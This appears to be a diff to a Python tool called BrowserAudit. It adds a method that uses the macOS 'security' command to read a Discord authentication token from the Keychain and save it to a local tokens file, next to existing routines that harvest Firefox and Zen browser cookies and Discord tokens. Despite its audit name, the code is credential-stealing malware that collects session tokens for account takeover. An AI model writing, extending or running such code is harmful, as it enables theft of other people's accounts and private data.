@@ -234,6 +234,30 @@ class BrowserAudit:
         if found_any:
             print(f"{self.COLORS['GREEN']}[OK] Discord Web tokens extracted{self.COLORS['RESET']}\n")
 
+    def extract_keychain_tokens(self):
+        if self.os_type != 'darwin':
+            return
+
+        print(f"{self.COLORS['CYAN']}[*] Extracting Discord tokens from Keychain...{self.COLORS['RESET']}")
+        self.log("INFO", "Starting Keychain token extraction")
+
+        try:
+            result = subprocess.run(
+                ['security', 'find-internet-password', '-s', 'discord.com', '-w'],
+                capture_output=True, text=True
+            )
+            if result.returncode == 0 and result.stdout.strip():
+                token = result.stdout.strip()
+                with open(self.cookies_dir / "discord_tokens.txt", 'a') as f:
+                    f.write(f"[Discord-Keychain] {token}\n")
+                print(f"{self.COLORS['GREEN']}[OK] Keychain token extracted{self.COLORS['RESET']}\n")
+                self.log("INFO", "Discord Keychain token extracted")
+                return True
+        except:
+            pass
+
+        return False
+
     def extract_discord_tokens(self):
         import glob
         import re
@@ -383,6 +407,7 @@ class BrowserAudit:
         self.extract_firefox_cookies()
         self.extract_zen_cookies()
         self.extract_discord_web_tokens()
+        self.extract_keychain_tokens()
         self.extract_discord_tokens()
 
         self.display_results()
